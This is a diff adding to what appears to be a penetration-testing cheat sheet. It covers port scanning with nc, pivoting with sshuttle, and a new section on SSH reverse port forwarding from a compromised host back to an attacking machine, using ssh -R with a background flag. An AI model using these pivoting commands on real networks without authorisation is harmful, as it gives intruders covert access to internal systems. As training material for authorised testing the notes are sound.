@@ -32,7 +32,22 @@ nc -zv <IP> 1-65535
 ```bash
 └─$ sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
 ```
+# Reverse Port forward using OpenSSH
+```powershell
+ssh-keygen  # Generate key
+```
+- Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first
+```powershell
+sudo systemctl status ssh    # Check ssh status on attacking machine
 
+sudo systemctl start ssh    # Start ssh on attacking machine
+
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+OR
+
+ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
 
 # Windows Enumeration using SEATBELT
 ```powershell
